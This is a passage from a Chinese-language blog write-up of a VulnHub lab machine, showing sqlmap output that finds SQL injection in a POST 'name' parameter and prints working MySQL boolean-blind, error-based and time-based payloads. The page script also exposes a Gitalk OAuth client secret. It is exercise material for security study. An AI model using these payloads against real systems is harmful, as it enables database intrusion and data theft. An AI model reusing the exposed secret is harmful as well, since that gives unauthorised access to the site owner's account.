only valid parameter values so sqlmap could be able to run properly<br>[15:16:57] [WARNING] provided value <span class="hljs-keyword">for</span> parameter <span class="hljs-string">&#x27;org&#x27;</span> is empty. Please, always use only valid parameter values so sqlmap could be able to run properly<br>[15:16:57] [INFO] testing connection to the target URL<br>[15:16:58] [INFO] testing <span class="hljs-keyword">if</span> the target URL content is stable<br>[15:16:58] [INFO] target URL content is stable<br>[15:16:58] [INFO] testing <span class="hljs-keyword">if</span> POST parameter <span class="hljs-string">&#x27;name&#x27;</span> is dynamic<br>[15:16:58] [WARNING] POST parameter <span class="hljs-string">&#x27;name&#x27;</span> does not appear to be dynamic<br>[15:16:58] [INFO] heuristic (basic) <span class="hljs-built_in">test</span> shows that POST parameter <span class="hljs-string">&#x27;name&#x27;</span> might be injectable (possible DBMS: <span class="hljs-string">&#x27;MySQL&#x27;</span>)<br>[15:16:58] [INFO] heuristic (XSS) <span class="hljs-built_in">test</span> shows that POST parameter <span class="hljs-string">&#x27;name&#x27;</span> might be vulnerable to cross-site scripting (XSS) attacks<br>[15:16:58] [INFO] testing <span class="hljs-keyword">for</span> SQL injection on POST parameter <span class="hljs-string">&#x27;name&#x27;</span><br>it looks like the back-end DBMS is <span class="hljs-string">&#x27;MySQL&#x27;</span>. Do you want to skip <span class="hljs-built_in">test</span> payloads specific <span class="hljs-keyword">for</span> other DBMSes? [Y/n] <br><span class="hljs-keyword">for</span> the remaining tests, <span class="hljs-keyword">do</span> you want to include all tests <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;MySQL&#x27;</span> extending provided level (1) and risk (1) values? [Y/n] <br>[15:17:06] [INFO] testing <span class="hljs-string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span><br>[15:17:06] [WARNING] reflective value(s) found and filtering out<br>[15:17:06] [INFO] testing <span class="hljs-string">&#x27;Boolean-based blind - Parameter replace (original value)&#x27;</span><br>[15:17:06] [INFO] testing <span class="hljs-string">&#x27;Generic inline queries&#x27;</span><br>[15:17:06] [INFO] testing <span class="hljs-string">&#x27;AND boolean-based blind - WHERE or HAVING clause (MySQL comment)&#x27;</span><br>[15:17:06] [INFO] testing <span class="hljs-string">&#x27;OR boolean-based blind - WHERE or HAVING clause (MySQL comment)&#x27;</span><br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)&#x27;</span><br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause&#x27;</span>                                                                                        <br>[15:17:07] [INFO] POST parameter <span class="hljs-string">&#x27;name&#x27;</span> appears to be <span class="hljs-string">&#x27;MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause&#x27;</span> injectable (with --string=<span class="hljs-string">&quot;to&quot;</span>)                            <br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)&#x27;</span>                                                                         <br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)&#x27;</span>                                                                                              <br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)&#x27;</span>                                                                                     <br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)&#x27;</span><br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)&#x27;</span>                                                                             <br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)&#x27;</span><br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)&#x27;</span>                                                                             <br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)&#x27;</span><br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;</span>                                                                                   <br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;</span>                                                                                    <br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;</span>                                                                            <br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;</span>                                                                             <br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)&#x27;</span>                                                                               <br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)&#x27;</span>                                                                                <br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;</span>                                                                                   <br>[15:17:07] [INFO] POST parameter <span class="hljs-string">&#x27;name&#x27;</span> is <span class="hljs-string">&#x27;MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;</span> injectable                                                       <br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL inline queries&#x27;</span><br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 stacked queries (comment)&#x27;</span><br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 stacked queries&#x27;</span><br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)&#x27;</span><br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 stacked queries (query SLEEP)&#x27;</span><br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &lt; 5.0.12 stacked queries (BENCHMARK - comment)&#x27;</span><br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &lt; 5.0.12 stacked queries (BENCHMARK)&#x27;</span><br>[15:17:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span><br>[15:17:17] [INFO] POST parameter <span class="hljs-string">&#x27;name&#x27;</span> appears to be <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span> injectable                                                                           <br>[15:17:17] [INFO] testing <span class="hljs-string">&#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span><br>[15:17:17] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (NULL) - 1 to 20 columns&#x27;</span><br>[15:17:17] [INFO] automatically extending ranges <span class="hljs-keyword">for</span> UNION query injection technique tests as there is at least one other (potential) technique found<br>[15:17:17] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (random number) - 1 to 20 columns&#x27;</span><br>[15:17:17] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (NULL) - 21 to 40 columns&#x27;</span><br>[15:17:18] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (random number) - 21 to 40 columns&#x27;</span><br>[15:17:18] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (NULL) - 41 to 60 columns&#x27;</span><br>[15:17:18] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (random number) - 41 to 60 columns&#x27;</span><br>[15:17:18] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (NULL) - 61 to 80 columns&#x27;</span><br>[15:17:18] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (random number) - 61 to 80 columns&#x27;</span><br>[15:17:18] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (NULL) - 81 to 100 columns&#x27;</span><br>[15:17:18] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (random number) - 81 to 100 columns&#x27;</span><br>POST parameter <span class="hljs-string">&#x27;name&#x27;</span> is vulnerable. Do you want to keep testing the others (<span class="hljs-keyword">if</span> any)? [y/N] <br>sqlmap identified the following injection point(s) with a total of 396 HTTP(s) requests:<br>---<br>Parameter: name (POST)<br>    Type: boolean-based blind<br>    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause<br>    Payload: name=1<span class="hljs-string">&#x27; RLIKE (SELECT (CASE WHEN (3453=3453) THEN 1 ELSE 0x28 END))-- fkrZ&amp;email=&amp;phone=&amp;org=</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Type: error-based</span><br><span class="hljs-string">    Title: MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="hljs-string">    Payload: name=1&#x27;</span> AND ROW(9202,7421)&gt;(SELECT COUNT(*),CONCAT(0x716b766271,(SELECT (ELT(9202=9202,1))),0x7171627a71,FLOOR(RAND(0)*2))x FROM (SELECT 5809 UNION SELECT 6254 UNION SELECT 2907 UNION SELECT 3295)a GROUP BY x)-- lorR&amp;email=&amp;phone=&amp;org=<br><br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: name=1<span class="hljs-string">&#x27; AND (SELECT 6598 FROM (SELECT(SLEEP(5)))WnCm)-- cXmx&amp;email=&amp;phone=&amp;org=</span><br><span class="hljs-string">---</span><br><span class="hljs-string">[15:17:23] [INFO] the back-end DBMS is MySQL</span><br><span class="hljs-string">web server operating system: Linux Fedora 6 or 8 or 7 (Moonshine or Zod or Werewolf)</span><br><span class="hljs-string">web application technology: Apache 2.2.6, PHP 5.2.4</span><br><span class="hljs-string">back-end DBMS: MySQL &gt;= 4.1</span><br><span class="hljs-string">[15:17:23] [INFO] fetched data logged to text files under &#x27;</span>/root/.local/share/sqlmap/output/192.168.56.139<span class="hljs-string">&#x27;                                                                                     </span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] ending @ 15:17:23 /2023-04-27/</span><br></code></pre></td></tr></table></figure>

<p>可惜获得的凭证只能用于登录blog页面，并不能登录后台以及ssh连接，价值不大。<br class='item-img' data-src='/pic/assets/1682582208788-d567501b-7d14-4c47-867b-cf9543c88a28.png'><img src="/pic/assets/1682582208788-d567501b-7d14-4c47-867b-cf9543c88a28.png" alt="uTools_1682580664805.png"></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/05/24/penetration_note/">← Next Privilege Escalation</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/05/24/jarbas/">[vulnhub]  jarbas Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="gitalk-sel"></button></div><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Info-Gather"><span class="toc-number">1.</span> <span class="toc-text">Info Gather</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">1.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">1.2.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RFI%EF%BC%88F%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">RFI（F）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQLi%EF%BC%88F%EF%BC%89"><span class="toc-number">1.2.2.</span> <span class="toc-text">SQLi（F）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LFI%EF%BC%88F%EF%BC%89"><span class="toc-number">1.2.3.</span> <span class="toc-text">LFI（F）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Samba%EF%BC%88F%EF%BC%89"><span class="toc-number">1.2.4.</span> <span class="toc-text">Samba（F）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NanoCMS%EF%BC%88S%EF%BC%89"><span class="toc-number">1.2.5.</span> <span class="toc-text">NanoCMS（S）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Priv-E"><span class="toc-number">2.</span> <span class="toc-text">Priv E</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">2.1.</span> <span class="toc-text">补充</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plu</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
 clientID: 'd746fee266fd40784c87',
 clientSecret: '18467221d189fe0e0b51bd234fcd04785a28ab09',
 repo: 'T3yT3y.github.io',
 owner: 'T3yT3y',
 admin: ['T3yT3y'],
 distractionFreeMode: false,
 id: location.pathname
});
if (document.querySelector("#gitalk")) gitalk.render("gitalk");code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>